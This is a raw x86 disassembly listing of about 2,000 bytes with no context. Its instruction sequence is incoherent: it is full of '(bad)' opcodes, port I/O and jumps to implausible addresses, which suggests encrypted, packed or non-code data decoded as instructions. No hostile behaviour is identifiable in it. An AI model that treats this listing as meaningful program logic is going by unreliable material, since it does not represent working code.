  4142aa:	push   ecx
  4142ab:	xor    al,0x1c
  4142ad:	je     0x4142f2
  4142af:	jb     0x41426f
  4142b1:	loopne 0x414257
  4142b3:	jmp    0xc556b933
  4142b8:	ins    BYTE PTR es:[edi],dx
  4142b9:	aam    0xfc
  4142bb:	cdq    
  4142bc:	jmp    0x5ad08b5f
  4142c1:	ja     0x41424b
  4142c3:	xor    ebx,DWORD PTR [ebx+0x1a00ee68]
  4142c9:	jp     0x414286
  4142cb:	aam    0x2e
  4142cd:	stos   DWORD PTR es:[edi],eax
  4142ce:	(bad)
  4142d2:	inc    edx
  4142d3:	dec    ecx
  4142d4:	sbb    al,0xb2
  4142d6:	mov    ah,BYTE PTR [ecx]
  4142d8:	push   ds
  4142d9:	sbb    al,0x25
  4142db:	loop   0x414287
  4142dd:	and    bl,BYTE PTR [ebp-0x6d47e21f]
  4142e3:	adc    ch,BYTE PTR [edx+0x51]
  4142e6:	test   eax,0x47b2aa71
  4142eb:	mov    edi,0xbfd0b7b7
  4142f0:	mov    ds,edx
  4142f2:	inc    edi
  4142f3:	inc    ecx
  4142f4:	lahf   
  4142f5:	pushf  
  4142f6:	mov    esi,0x57ae3acc
  4142fb:	mov    bl,0x6e
  4142fd:	inc    ebx
  4142fe:	icebp  
  4142ff:	div    DWORD PTR [ebx-0x6f]
  414302:	push   ds
  414303:	aam    0xf4
  414305:	clc    
  414306:	pop    es
  414307:	jnp    0x4142ed
  414309:	jb     0x4142a2
  41430b:	in     eax,dx
  41430c:	and    al,0xf7
  41430e:	cli    
  41430f:	add    esi,0x6298d5e5
  414315:	inc    ecx
  414316:	cld    
  414317:	out    0x3d,eax
  414319:	sub    esi,ebp
  41431b:	inc    edx
  41431c:	popa   
  41431d:	fwait
  41431e:	sahf   
  41431f:	aam    0x2d
  414321:	aam    0x20
  414323:	cmp    al,BYTE PTR ds:0x1eb167a9
  414329:	xor    DWORD PTR [ecx],eax
  41432b:	and    DWORD PTR [ebp+0x3207fb66],ecx
  414331:	xor    eax,0xf9c39738
  414336:	push   es
  414337:	and    al,0xd7
  414339:	fidivr DWORD PTR [edx]
  41433b:	adc    BYTE PTR [esi-0x1f22ac23],cl
  414341:	int3   
  414342:	into   
  414343:	push   eax
  414344:	pop    ebp
  414345:	in     eax,0x2e
  414347:	in     eax,dx
  414348:	test   eax,0x7c59779b
  41434d:	fwait
  41434e:	dec    edi
  41434f:	add    DWORD PTR [edi],ebp
  414351:	fldenv gs:[edx+ecx*4-0x7e]
  414356:	jmp    0xcf17f5c7
  41435b:	lahf   
  41435c:	mov    ah,BYTE PTR [ecx-0x14]
  41435f:	sbb    dl,al
  414361:	dec    ecx
  414362:	mov    ds:0x2ac8e04c,eax
  414367:	fist   DWORD PTR [ecx+0x139dcb27]
  41436d:	pop    ds
  41436e:	out    0x12,eax
  414370:	shl    BYTE PTR [eax+0x23],1
  414373:	pop    es
  414374:	xor    al,0xba
  414376:	push   ebx
  414377:	inc    ebp
  414378:	cmc    
  414379:	loop   0x4143a6
  41437b:	aad    0x33
  41437d:	out    dx,al
  41437e:	jns    0x4143c8
  414380:	pop    edx
  414381:	jmp    0x296a:0xde3f52
  414388:	push   esi
  414389:	jl     0x41434b
  41438b:	inc    edi
  41438c:	shr    BYTE PTR [ebx+0x6e],cl
  41438f:	and    edi,DWORD PTR [esi-0x2ed304b0]
  414395:	dec    edi
  414396:	add    eax,DWORD PTR [ebp+0x648762af]
  41439c:	push   eax
  41439d:	jmp    0x4143bb
  41439f:	jge    0x41434c
  4143a1:	xor    ecx,edx
  4143a3:	mov    ebx,DWORD PTR [ebp+0x7d]
  4143a6:	mov    dh,BYTE PTR [ebx]
  4143a8:	(bad)  
  4143a9:	aas    
  4143aa:	test   al,0xb5
  4143ac:	push   0xfffffffc
  4143ae:	mov    edx,0xfd2bc91c
  4143b3:	gs in  eax,0xa7
  4143b6:	jne    0x414407
  4143b8:	pop    eax
  4143b9:	fldz   
  4143bb:	inc    BYTE PTR [ecx+0x2f]
  4143be:	loop   0x414382
  4143c0:	call   0x8b2c8010
  4143c5:	sbb    DWORD PTR [edi+edx*1+0x3e],edx
  4143c9:	ror    BYTE PTR [edi-0x11],cl
  4143cc:	dec    di
  4143ce:	aad    0xf6
  4143d0:	add    ah,BYTE PTR [ebp+0x72]
  4143d3:	sbb    BYTE PTR [eax-0x41],bl
  4143d6:	aam    0x42
  4143d8:	ds xchg ebp,eax
  4143da:	lods   eax,DWORD PTR ds:[esi]
  4143db:	mov    edx,0x26a1d531
  4143e0:	fimul  WORD PTR [ecx-0x2f0690a]
  4143e6:	xchg   ebx,eax
  4143e7:	fst    QWORD PTR [ecx+0x11233838]
  4143ed:	add    ch,al
  4143ef:	jl     0x414420
  4143f1:	rol    BYTE PTR [ebp-0x75],0xf5
  4143f5:	sbb    BYTE PTR ds:0x63c1b903,ah
  4143fb:	jmp    0x414465
  4143fd:	hlt    
  4143fe:	adc    ah,BYTE PTR [ebp-0x7a62ec7c]
  414404:	(bad)  
  414405:	je     0x414475
  414407:	std    
  414408:	pop    esi
  414409:	adc    ah,BYTE PTR [ebp-0x7f007bce]
  41440f:	pop    es
  414410:	sbb    esp,DWORD PTR [eax-0x13]
  414413:	adc    eax,DWORD PTR [eax+0x1e]
  414416:	je     0x414494
  414418:	jne    0x414459
  41441a:	sbb    eax,0xbd4b7687
  41441f:	adc    bl,dl
  414421:	call   0xcfffbcbf
  414426:	mov    bh,0x91
  414428:	pop    eax
  414429:	in     eax,0x31
  41442b:	hlt    
  41442c:	test   DWORD PTR [ebx],esp
  41442e:	fild   DWORD PTR [esi-0x33b0dde5]
  414434:	push   0x54
  414436:	xlat   BYTE PTR ds:[ebx]
  414437:	pop    ebp
  414438:	push   ebp
  414439:	push   es
  41443a:	mov    dh,0xa7
  41443c:	jecxz  0x41442a
  41443e:	int    0xe8
  414440:	les    ebx,FWORD PTR [eax-0x146c871f]
  414446:	shl    edi,1
  414448:	xor    edx,DWORD PTR [ebx+0x8]
  41444b:	inc    ecx
  41444c:	sub    DWORD PTR [ebp-0x587164d9],ecx
  414452:	imul   esi,DWORD PTR [ebp-0x1f099347],0x9ab63dd9
  41445c:	xchg   ebx,eax
  41445d:	mov    eax,ds:0x67e4a82e
  414462:	aam    0x34
  414464:	arpl   WORD PTR [ecx],si
  414466:	mov    edx,0x60931b52
  41446b:	mov    ch,0xd7
  41446d:	jmp    FWORD PTR [eax+0x3]
  414470:	xor    eax,0x19e93941
  414475:	dec    BYTE PTR [eax+0x54]
  414478:	mov    eax,0x7ccc9a82
  41447d:	mov    cl,0x82
  41447f:	rcl    BYTE PTR [ebp+0x7],cl
  414482:	das    
  414483:	mov    eax,0xbe491a2e
  414488:	(bad)  
  41448a:	sbb    al,0xb5
  41448c:	out    dx,eax
  41448d:	sbb    ebx,edi
  41448f:	sbb    eax,0xffffffbf
  414492:	idiv   BYTE PTR [eax+0x30]
  414495:	ds jp  0x414491
  414498:	fmul   QWORD PTR [eax]
  41449a:	call   0x73344d24
  41449f:	sub    eax,0xb9762736
  4144a4:	sbb    DWORD PTR [eax-0x1e],edi
  4144a7:	pop    esi
  4144a8:	mov    ecx,DWORD PTR [ecx-0x60]
  4144ab:	pop    es
  4144ac:	js     0x4144e7
  4144ae:	sub    dh,BYTE PTR [edx]
  4144b0:	push   cs
  4144b1:	dec    ebp
  4144b2:	in     eax,0x73
  4144b4:	das    
  4144b5:	xchg   esp,eax
  4144b6:	cmp    DWORD PTR [edx+ebp*4-0x558e6fe1],edx
  4144bd:	int    0x81
  4144bf:	push   cs
  4144c0:	(bad)  
  4144c1:	int3   
  4144c2:	adc    ecx,DWORD PTR [eax-0x6]
  4144c5:	xchg   edx,eax
  4144c6:	mov    dh,0x27
  4144c8:	add    DWORD PTR [edi+edx*2],eax
  4144cb:	xchg   ebx,eax
  4144cc:	jbe    0x4144d2
  4144ce:	in     al,dx
  4144cf:	xor    ebx,DWORD PTR ds:[edx+0x53]
  4144d3:	dec    edx
  4144d4:	cmp    BYTE PTR [ebx+0x3b855614],ah
  4144da:	jmp    0x45d9da4f
  4144df:	out    dx,al
  4144e0:	mov    BYTE PTR [ebx+0x46],cl
  4144e3:	daa    
  4144e4:	add    BYTE PTR [edi],ah
  4144e6:	enter  0x20da,0x84
  4144ea:	or     eax,0x80c9a57e
  4144ef:	pop    ebx
  4144f0:	aas    
  4144f1:	adc    ch,BYTE PTR [esi-0xf]
  4144f4:	pop    esp
  4144f5:	mov    cs,WORD PTR [ecx+ebx*8]
  4144f8:	mov    ebp,0x2495abe0
  4144fd:	cmp    dh,BYTE PTR [ecx]
  4144ff:	push   0x4334af12
  414504:	dec    eax
  414505:	cmp    BYTE PTR [ebx],bh
  414507:	or     ah,BYTE PTR [edi+eiz*2-0x599ebd22]
  41450e:	jbe    0x41458d
  414510:	cmp    dh,BYTE PTR [edi+0x2209574e]
  414516:	sahf   
  414517:	(bad)
  41451b:	push   ss
  41451c:	ror    BYTE PTR gs:[ecx],cl
  41451f:	mov    ch,BYTE PTR [edi+0x6d]
  414522:	popf   
  414523:	mov    eax,ds:0x57f75bec
  414528:	loop   0x414593
  41452a:	call   esp
  41452c:	xor    al,0xa6
  41452e:	in     al,0x9a
  414530:	or     al,0x68
  414532:	les    esp,FWORD PTR [esi+esi*2+0x18]
  414536:	mov    dl,0x4a
  414538:	bound  ecx,QWORD PTR [edi+edx*1]
  41453b:	add    bh,BYTE PTR [ecx+0x24364a1c]
  414541:	cmp    BYTE PTR [edi-0x781bf33e],ah
  414547:	adc    ebp,DWORD PTR [ebp+0xe]
  41454a:	aaa    
  41454b:	push   ebx
  41454c:	jl     0x4145b3
  41454e:	add    al,0xcf
  414550:	or     DWORD PTR [ecx],ebp
  414552:	nop
  414553:	aam    0xce
  414555:	mov    ch,0x60
  414557:	(bad)  
  414558:	int    0xfc
  41455a:	pop    es
  41455b:	repz jo 0x414592
  41455e:	retf   
  41455f:	or     DWORD PTR [ebp+0x73],eax
  414562:	and    DWORD PTR [ebx+esi*2-0x7c],edi
  414566:	dec    ebx
  414567:	cli    
  414568:	or     DWORD PTR ds:0xe1b9e0a6,eax
  41456e:	fld    DWORD PTR [esi+0x422ff3f5]
  414574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414575:	scas   al,BYTE PTR es:[edi]
  414576:	sub    BYTE PTR [ecx+0x4a],0xe9
  41457a:	test   eax,0x33381ecb
  41457f:	sub    ebx,DWORD PTR [edx]
  414581:	and    BYTE PTR [esi],dl
  414583:	mov    eax,0x74e1d3d0
  414588:	jae    0x4145e9
  41458a:	in     eax,dx
  41458b:	pop    esp
  41458c:	inc    ecx
  41458d:	(bad)  
  41458e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41458f:	and    dh,bl
  414591:	pop    ss
  414592:	xor    BYTE PTR [esi-0x2334c779],ah
  414598:	outs   dx,DWORD PTR ds:[esi]
  414599:	out    dx,eax
  41459a:	sub    ah,BYTE PTR [eax]
  41459c:	and    bl,bh
  41459e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41459f:	das    
  4145a0:	sub    al,bh
  4145a2:	dec    esp
  4145a3:	sbb    eax,0x3b6c5b8f
  4145a8:	push   ecx
  4145a9:	fisttp DWORD PTR [ebx+0x693d29f9]
  4145af:	lea    eax,[ebp-0x16]
  4145b2:	mov    ah,cl
  4145b4:	add    BYTE PTR [ebx-0x62],cl
  4145b7:	hlt    
  4145b8:	imul   ebx,DWORD PTR [ebx],0xd9e92986
  4145be:	sbb    bh,BYTE PTR [esi+0x4a]
  4145c1:	and    al,0xfd
  4145c3:	out    dx,al
  4145c4:	mov    ebx,0xac2ddbb6
  4145c9:	and    DWORD PTR [edi-0x27],ecx
  4145cc:	sbb    eax,0x2c755e9b
  4145d1:	fild   QWORD PTR [ecx]
  4145d3:	jge    0x4145e5
  4145d5:	xchg   edi,eax
  4145d6:	jge    0x4145a7
  4145d8:	cmp    eax,0xc8254501
  4145dd:	pop    eax
  4145de:	jno    0x4145e8
  4145e0:	push   0xffffffff
  4145e2:	es retf 0x8998
  4145e6:	pushf  
  4145e7:	inc    ebx
  4145e8:	lods   al,BYTE PTR ds:[esi]
  4145e9:	mov    bl,al
  4145eb:	push   cs
  4145ec:	hlt    
  4145ed:	sbb    bh,BYTE PTR [edx-0x456e522d]
  4145f3:	popa   
  4145f4:	jecxz  0x414612
  4145f6:	jge    0x414588
  4145f8:	out    dx,eax
  4145f9:	outs   dx,BYTE PTR ds:[esi]
  4145fa:	jne    0x4145c2
  4145fc:	(bad)  
  4145fd:	jmp    0x128b4d6c
  414602:	test   BYTE PTR [edx+0x65],bh
  414605:	in     al,dx
  414606:	ficomp DWORD PTR [edx]
  414608:	pusha  
  414609:	adc    al,0x55
  41460b:	and    al,BYTE PTR [ebp-0x2a]
  41460e:	sub    DWORD PTR [edx+ecx*8+0x32ae12e9],eax
  414615:	ss jo  0x414599
  414618:	add    eax,0x704fe26b
  41461d:	mov    eax,0xdff1e55e
  414622:	outs   dx,DWORD PTR ds:[esi]
  414623:	mov    al,ds:0xcd886822
  414628:	and    DWORD PTR [esi-0x511320d7],eax
  41462e:	push   0xffffffe9
  414630:	ror    DWORD PTR [ebx-0x3fe89265],0x41
  414637:	add    DWORD PTR [eax],ecx
  414639:	test   dh,bl
  41463b:	sbb    bl,BYTE PTR [esi+0x6b]
  41463e:	mov    esp,0x93d6dc74
  414643:	ds pop ebp
  414645:	xor    dl,bh
  414647:	adc    DWORD PTR [esi+0xf],0x17cb67cf
  41464e:	pop    esi
  41464f:	test   eax,0x4f71dff7
  414654:	mov    al,ds:0x19926500
  414659:	push   ds
  41465a:	(bad)  
  41465b:	rcl    al,cl
  41465d:	inc    ebp
  41465e:	xchg   esp,eax
  41465f:	repnz fidivr WORD PTR gs:[ebx]
  414663:	jnp    0x414623
  414665:	pop    ebx
  414666:	mov    bh,0x72
  414668:	push   esi
  414669:	sbb    al,0xe1
  41466b:	inc    ebx
  41466c:	adc    ecx,DWORD PTR [ecx+0x10]
  41466f:	jb     0x4146e4
  414671:	jo     0x414675
  414673:	imul   di,bp,0xae65
  414678:	fdiv   DWORD PTR [eax-0x36]
  41467b:	xchg   ebx,eax
  41467c:	cmp    DWORD PTR [edi+eiz*2],esp
  41467f:	cli    
  414680:	hlt    
  414681:	xchg   ebx,eax
  414682:	clc    
  414683:	jecxz  0x414630
  414685:	(bad)  
  414686:	jae    0x41466a
  414688:	dec    ebx
  414689:	mov    ah,0x70
  41468b:	sub    BYTE PTR [ecx-0x3a8f8c9e],bh
  414691:	mov    eax,0xd0e28b26
  414696:	pop    esp
  414697:	or     ebx,DWORD PTR [esi+0x177338c2]
  41469d:	or     eax,0x5aa0c45b
  4146a2:	dec    eax
  4146a3:	xchg   ecx,eax
  4146a4:	mov    bl,0x8
  4146a6:	and    DWORD PTR [edi],ebx
  4146a8:	pop    ss
  4146a9:	mov    al,0x62
  4146ab:	rcl    DWORD PTR [ecx+0x6f],0x51
  4146af:	stos   BYTE PTR es:[edi],al
  4146b0:	call   DWORD PTR [edi-0x6486f46d]
  4146b6:	pop    ecx
  4146b7:	and    BYTE PTR [eax],bh
  4146b9:	mov    ds:0xbd7c21e1,al
  4146be:	cdq    
  4146bf:	movq   mm4,QWORD PTR [eax]
  4146c2:	inc    ebp
  4146c3:	cs aas 
  4146c5:	pop    ss
  4146c6:	shl    DWORD PTR [edi+0x7c677a62],0xfa
  4146cd:	outs   dx,BYTE PTR ds:[esi]
  4146ce:	loopne 0x4146a5
  4146d0:	inc    ebp
  4146d1:	sti    
  4146d2:	pop    eax
  4146d3:	push   ss
  4146d4:	stos   DWORD PTR es:[edi],eax
  4146d5:	fldln2 
  4146d7:	xor    ecx,0x3565425e
  4146dd:	enter  0x4ff4,0x7b
  4146e1:	sub    BYTE PTR [edi],al
  4146e3:	mov    bl,0x3e
  4146e5:	nop
  4146e6:	jg     0x4146f0
  4146e8:	xchg   ebp,eax
  4146e9:	and    edi,DWORD PTR ds:0xa1aadee3
  4146ef:	and    DWORD PTR [edi-0x4b],ebx
  4146f2:	jno    0x4146c8
  4146f4:	gs jo  0x414755
  4146f7:	scas   al,BYTE PTR es:[edi]
  4146f8:	or     ecx,ebp
  4146fa:	icebp  
  4146fb:	shl    DWORD PTR [eax+edx*1],0xe0
  4146ff:	(bad)  
  414700:	test   DWORD PTR [ebx-0x36b0ff51],ebx
  414706:	imul   ebp,DWORD PTR [eax],0x4cd7703
  41470c:	repz bound esi,QWORD PTR [ebx-0x60]
  414710:	mov    cl,0x2a
  414712:	dec    ebx
  414713:	sbb    DWORD PTR [ecx-0x6e],ebx
  414716:	sbb    DWORD PTR [edx-0x15],ebx
  414719:	mov    DWORD PTR [ebx],0xfee22d76
  41471f:	out    0x6e,al
  414721:	pop    esp
  414722:	lock inc esp
  414724:	push   ecx
  414725:	mov    edx,0xb151c908
  41472a:	inc    edx
  41472b:	inc    edx
  41472c:	sub    BYTE PTR ds:0x97a340ca,0x70
  414733:	mov    eax,0xfc2ff87b
  414738:	int3   
  414739:	popf   
  41473a:	adc    ch,0x9a
  41473d:	add    al,0xb6
  41473f:	(bad)  
  414740:	mov    ds:0xee41beca,eax
  414745:	loope  0x414762
  414747:	add    DWORD PTR [eax+ecx*4-0x2f],ebx
  41474b:	pop    ebp
  41474c:	push   ebp
  41474d:	fsubr  QWORD PTR [esi]
  41474f:	mov    ?,WORD PTR [eax*4-0x13642867]
  414756:	pop    eax
  414757:	pusha  
  414758:	xor    BYTE PTR [eax-0x1b77bb0a],al
  41475e:	or     al,0x42
  414760:	xchg   ch,ah
  414762:	ins    BYTE PTR es:[edi],dx
  414763:	jns    0x4147af
  414765:	cvtdq2ps xmm5,XMMWORD PTR [edx-0x7d]
  414769:	repnz adc al,BYTE PTR ds:0x128c4e77
  414770:	mov    DWORD PTR [edx],eax
  414772:	fldenv [esi-0x36]
  414775:	inc    eax
  414776:	pop    esi
  414777:	sub    edx,DWORD PTR [edi-0x5a8acbe4]
  41477d:	in     al,dx
  41477e:	test   BYTE PTR [edi],dl
  414780:	loopne 0x414723
  414782:	fst    DWORD PTR [esi+edx*1+0x327ba7c2]
  414789:	push   0x1a513e85
  41478e:	in     al,dx
  41478f:	dec    esi
  414790:	add    al,0xc0
  414792:	jle    0x41476f
  414794:	inc    ecx
  414795:	pop    ss
  414796:	adc    ebx,DWORD PTR ds:0xc003fa73
  41479c:	fcomp  st(7)
  41479e:	xchg   dx,bp
  4147a1:	dec    eax
  4147a2:	ret    0xc63e
  4147a5:	pop    ss
  4147a6:	call   0xc123:0x4e25a5a4
  4147ad:	popf   
  4147ae:	xchg   esp,eax
  4147af:	xchg   esp,eax
  4147b0:	cmp    eax,DWORD PTR [edx+eiz*4]
  4147b3:	or     BYTE PTR [ebp-0x347ead08],ah
  4147b9:	retf   
  4147ba:	in     al,dx
  4147bb:	cmp    ecx,DWORD PTR [ebx-0x191a7697]
  4147c1:	call   0x2217f6b0
  4147c6:	(bad)  
  4147c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147c9:	test   BYTE PTR [ecx-0x4a4a7c01],bl
  4147cf:	popa   
  4147d0:	or     BYTE PTR [eax-0x4fb01b62],cl
  4147d6:	lds    ebp,FWORD PTR [edi]
  4147d8:	pop    ebp
  4147d9:	int    0x8a
  4147db:	(bad)  
  4147dc:	pop    ds
  4147dd:	or     DWORD PTR [ebx+eiz*1-0x142fc5d7],0x53
  4147e5:	sbb    eax,0xbc8a3d7d
  4147ea:	je     0x41477b
  4147ec:	mov    ecx,0x3ac28d7e
  4147f1:	push   ebx
  4147f2:	jmp    0xa0c69072
  4147f7:	mov    ds:0xd95f84b,eax
  4147fc:	ins    BYTE PTR es:[edi],dx
  4147fd:	push   ebx
  4147fe:	xor    eax,0x3ee09ac6
  414803:	(bad)  
  414804:	(bad)  
  414805:	loop   0x4147a6
  414807:	outs   dx,BYTE PTR ds:[esi]
  414808:	jmp    0x41480d
  41480a:	ss (bad) 
  41480c:	cmp    DWORD PTR [eax],ebx
  41480e:	in     eax,0xbe
  414810:	mov    esi,0x23fc92ee
  414815:	xor    eax,0x927b480
  41481a:	push   ds
  41481b:	mov    bl,0x7d
  41481d:	add    DWORD PTR [esi],ecx
  41481f:	jae    0x4147b2
  414821:	add    esp,esi
  414823:	(bad)  
  414825:	xchg   ebp,eax
  414826:	push   cs
  414827:	sbb    DWORD PTR [ebp-0x78a68741],ecx
  41482d:	mov    ecx,0x9b0f332e
  414832:	ds mov edx,0x2294ee4d
  414838:	add    DWORD PTR [ecx-0x6b835a1],ebp
  41483e:	out    dx,al
  41483f:	in     eax,dx
  414840:	cmp    eax,DWORD PTR [ebp-0x1c]
  414843:	scas   eax,DWORD PTR es:[edi]
  414844:	ret    0xb6b4
  414847:	xchg   ecx,eax
  414848:	(bad)  
  414849:	push   ds
  41484a:	dec    edx
  41484b:	test   DWORD PTR [esi+ebx*8],eax
  41484e:	add    DWORD PTR [ebx],edi
  414850:	cmc    
  414851:	mov    ebp,0x8f226277
  414856:	sti    
  414857:	pop    edi
  414858:	cwde   
  414859:	jnp    0x41482a
  41485b:	sub    bh,al
  41485d:	pop    eax
  41485e:	xor    BYTE PTR [ebx-0x3b216ea7],cl
  414864:	dec    eax
  414865:	xor    eax,0xd6421623
  41486a:	xchg   ebp,eax
  41486b:	retf   0x8f46
  41486e:	dec    eax
  41486f:	lock in al,dx
  414871:	(bad)  
  414873:	(bad)  
  414874:	out    dx,al
  414875:	adc    bl,BYTE PTR [ebx]
  414877:	test   BYTE PTR [edi-0x725c3534],dh
  41487d:	dec    ecx
  41487e:	mov    ebx,0x6bc23c9f
  414883:	push   cs
  414884:	in     eax,dx
  414885:	loopne 0x41481c
  414887:	jo     0x414898
  414889:	shl    DWORD PTR [edx+0x6c2e646d],cl
  41488f:	sub    al,ch
  414891:	inc    esp
  414892:	pop    eax
  414893:	pushf  
  414894:	out    0x52,eax
  414896:	push   cs
  414897:	push   ecx
  414898:	xchg   esi,eax
  414899:	add    BYTE PTR [ecx-0x6b],dh
  41489c:	xchg   BYTE PTR [ebx],dl
  41489e:	ret    0x52ae
  4148a1:	retf   
  4148a2:	fnstcw WORD PTR [eax-0x794324da]
  4148a8:	push   0x44822b52
  4148ad:	stos   BYTE PTR es:[edi],al
  4148ae:	fcmovnbe st,st(2)
  4148b0:	lods   eax,DWORD PTR ds:[esi]
  4148b1:	cmp    ah,ah
  4148b3:	out    0x86,al
  4148b5:	or     dh,BYTE PTR [eax-0x76]
  4148b8:	ins    DWORD PTR es:[edi],dx
  4148b9:	(bad)  
  4148ba:	sub    DWORD PTR [eax],edi
  4148bc:	xor    DWORD PTR [edi-0x677e0242],esp
  4148c2:	test   BYTE PTR [ebx-0x5ad02430],ch
  4148c8:	ret    0xb0c6
  4148cb:	shl    BYTE PTR [ecx+0x41],0xec
  4148cf:	xchg   esi,eax
  4148d0:	fdivp  st(2),st
  4148d2:	sbb    BYTE PTR [edx-0xdbe8b08],0x41
  4148d9:	push   es
  4148da:	sbb    BYTE PTR [ebp+0x3bc72629],al
  4148e0:	out    0x93,eax
  4148e2:	inc    esp
  4148e3:	and    al,0xf5
  4148e5:	prefetch BYTE PTR [ecx]
  4148e8:	daa    
  4148e9:	imul   esp,DWORD PTR [edx-0x5e],0x8bec4fb5
  4148f0:	rcr    edi,cl
  4148f2:	sbb    eax,0x9eafbd21
  4148f7:	push   ecx
  4148f8:	adc    ebp,esp
  4148fa:	mov    dl,0x56
  4148fc:	xor    BYTE PTR [esi],0xc6
  4148ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414900:	pop    eax
  414901:	xor    ch,BYTE PTR [ecx]
  414903:	jbe    0x4148db
  414905:	adc    eax,DWORD PTR [edi]
  414907:	ret    0x7137
  41490a:	inc    esp
  41490b:	test   eax,0x14cc2b4a
  414910:	pop    ss
  414911:	ret    
  414912:	mov    cl,0x4b
  414914:	mov    al,ds:0x611e9034
  414919:	pushf  
  41491a:	inc    ebp
  41491b:	push   ebx
  41491c:	sbb    al,0x4
  41491e:	fsub   st,st(5)
  414920:	mov    ds:0xee237908,al
  414925:	(bad)  
  414926:	mov    ds:0xddf4d87f,al
  41492b:	fnstsw WORD PTR [ebp+0x45]
  41492e:	(bad)  
  41492f:	or     al,0x68
  414931:	(bad)  
  414932:	or     edx,DWORD PTR [esi+ebx*8+0x38]
  414936:	adc    DWORD PTR [ecx-0x32b74c9c],ebp
  41493c:	or     BYTE PTR [ebp+eiz*2+0x163a0f2d],bh
  414943:	add    al,BYTE PTR [edi+0x3a]
  414946:	jmp    DWORD PTR [ebp-0x13b238ef]
  41494c:	mov    eax,0x39ba0280
  414951:	enter  0x27a,0xcb
  414955:	inc    edi
  414956:	add    BYTE PTR [ecx-0x36],dl
  414959:	in     eax,0x17
  41495b:	inc    ebp
  41495c:	dec    ecx
  41495d:	cmc    
  41495e:	sti    
  41495f:	sub    eax,0x48093239
  414964:	test   al,0xd1
  414966:	data16 (bad) 
  414968:	fimul  DWORD PTR [edx-0x2f09a162]
  41496e:	pusha  
  41496f:	sbb    BYTE PTR [edx+ecx*4+0x1b145dd9],al
  414976:	jns    0x414973
  414978:	xchg   esp,eax
  414979:	dec    ebx
  41497a:	mov    al,0xf5
  41497c:	test   al,0xc8
  41497e:	add    BYTE PTR [ebp+0x75c4af26],ah
  414984:	js     0x414961
  414986:	aas    
  414987:	(bad)  
  414988:	mov    cl,0x39
  41498a:	into   
  41498b:	adc    al,0x6b
  41498d:	mov    ebp,0xfcc1447
  414992:	stos   BYTE PTR es:[edi],al
  414993:	mov    edi,0xfbe55bae
  414998:	sbb    esi,DWORD PTR [edx+esi*4+0x432406cc]
  41499f:	or     eax,0x2797ebe7
  4149a4:	mov    BYTE PTR [eax],dh
  4149a6:	xlat   BYTE PTR ds:[ebx]
  4149a7:	cmp    BYTE PTR [ebp+0x2e],dl
  4149aa:	mov    bl,0xd2
  4149ac:	mov    al,0x8e
  4149ae:	jl     0x4149c8
  4149b0:	retf   0x62b1
  4149b3:	rol    BYTE PTR [eax+0x67eb2aff],0xe4
  4149ba:	inc    ebp
  4149bb:	add    BYTE PTR [edi],ah
  4149bd:	mov    bh,0xcd
  4149bf:	push   eax
  4149c0:	xchg   ecx,eax
  4149c1:	das    
  4149c2:	and    dl,BYTE PTR [esp+esi*8]
  4149c5:	xchg   DWORD PTR [edx],ebp
  4149c7:	jne    0x414a03
  4149c9:	lods   eax,DWORD PTR ds:[esi]
  4149ca:	fs dec esi
  4149cc:	and    cl,BYTE PTR [ecx]
  4149ce:	test   BYTE PTR [edi-0x2ade9caf],dl
  4149d4:	out    dx,al
  4149d5:	dec    esp
  4149d6:	js     0x4149df
  4149d8:	pop    ecx
  4149d9:	mov    ?,eax
  4149db:	mov    ds:0x9759817c,eax
  4149e0:	aad    0x25
  4149e2:	cdq    
  4149e3:	fcmovu st,st(5)
  4149e5:	cmp    DWORD PTR ds:0xc9fa14e5,edi
  4149eb:	sub    edx,DWORD PTR [ecx+0xe]
  4149ee:	lods   eax,DWORD PTR ds:[esi]
  4149ef:	test   DWORD PTR [ebp+eax*4+0x51b33560],esp
  4149f6:	popa   
  4149f7:	cmp    al,0x7
  4149f9:	in     eax,dx
  4149fa:	push   es
  4149fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149fc:	push   ebx
  4149fd:	and    al,0x64
  4149ff:	cdq    
  414a00:	add    eax,0xe37329e2
  414a05:	mov    eax,?
  414a07:	sub    esp,ebp
  414a09:	sub    ebx,ebx
  414a0b:	aam    0x0
  414a0d:	hlt    
  414a0e:	push   ss
  414a0f:	adc    bh,0x40
  414a12:	xor    DWORD PTR [edx+ebp*1-0x1e600c9],0x5e3544dc
  414a1d:	and    dh,BYTE PTR [esi]
  414a1f:	sahf   
  414a20:	mov    ecx,0x3f569b1a
  414a25:	mov    dh,0xa
  414a27:	push   esi
  414a28:	sbb    DWORD PTR [eax+esi*2-0x2d],ebp
  414a2c:	jne    0x414a03
  414a2e:	(bad)  
  414a2f:	(bad)  [ebx-0x51]
  414a32:	inc    edx
  414a33:	mov    ch,0x9b
  414a35:	repz pop esp
  414a37:	pop    edx
  414a38:	in     eax,dx
  414a39:	jo     0x414a11
  414a3b:	mov    eax,0xa3048ed4
  414a40:	jmp    0x17e2:0x6efd27ee
  414a47:	leave  
  414a48:	cwde   
  414a49:	mov    ah,0x9b
  414a4b:	push   ebx
  414a4c:	dec    edi
  414a4d:	fwait
  414a4e:	outs   dx,BYTE PTR ds:[esi]
  414a4f:	mov    cl,dl
  414a51:	jecxz  0x414a2d
  414a53:	pop    es
  414a54:	in     al,0xf8
  414a56:	mov    ecx,0x2867c026
  414a5b:	pop    es
  414a5c:	addr16 fmulp st(7),st
  414a5f:	imul   esp,edx,0xdcb94e47
  414a65:	jmp    0xdb5c68bf
  414a6a:	mov    ch,0x36
  414a6c:	cmp    dh,BYTE PTR [ecx+ebx*4]
  414a6f:	iret   
  414a70:	jmp    0x414a59
  414a72:	ds sahf 
  414a74:	mov    edx,DWORD PTR [ebp-0x1c]
  414a77:	xor    eax,esi
  414a79:	jmp    0x416dee
  414a7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a7f:	xchg   esi,eax
  414a80:	retf   
  414a81:	dec    eax
  414a82:	mov    esp,edi
  414a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a85:	xchg   esp,eax
  414a86:	dec    ecx
  414a87:	(bad)  
  414a88:	mov    ah,0x80
  414a8a:	or     DWORD PTR [esi+0x2e],edi
  414a8d:	aaa    
  414a8e:	out    dx,eax
  414a8f:	inc    edi
  414a90:	popa   
